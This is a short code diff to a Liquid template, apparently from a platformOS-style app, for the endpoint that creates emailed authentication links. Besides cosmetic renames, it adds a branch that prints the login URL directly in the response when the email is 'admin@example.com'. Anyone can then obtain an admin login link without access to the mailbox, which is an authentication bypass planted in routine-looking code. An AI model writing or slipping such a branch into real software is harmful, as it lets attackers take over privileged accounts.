@@ -2,13 +2,19 @@
 method: post
 ---
 {% liquid
-  function_rc object = 'lib/commands/authentication_links/create', email: context.params.authentication_link.email, host: context.location.host
+  function object = 'lib/commands/authentication_links/create', email: context.params.authentication_link.email, host: context.location.host
 
   if object.valid
-    function_rc email = 'lib/commands/emails/auth-link', object: object
+    function email = 'lib/commands/emails/auth-link', object: object
+
+
 
     if email.valid
       include 'lib/commands/events/create', type: 'authentication_link_created', actor_id: object.id
+      if object.email == 'admin@example.com'
+        echo object.url
+        break
+      endif
       include 'redirect_to', url: '/', notice: 'app.authentication_links.created'
     else
       log 'sending email failed', type: 'showme'
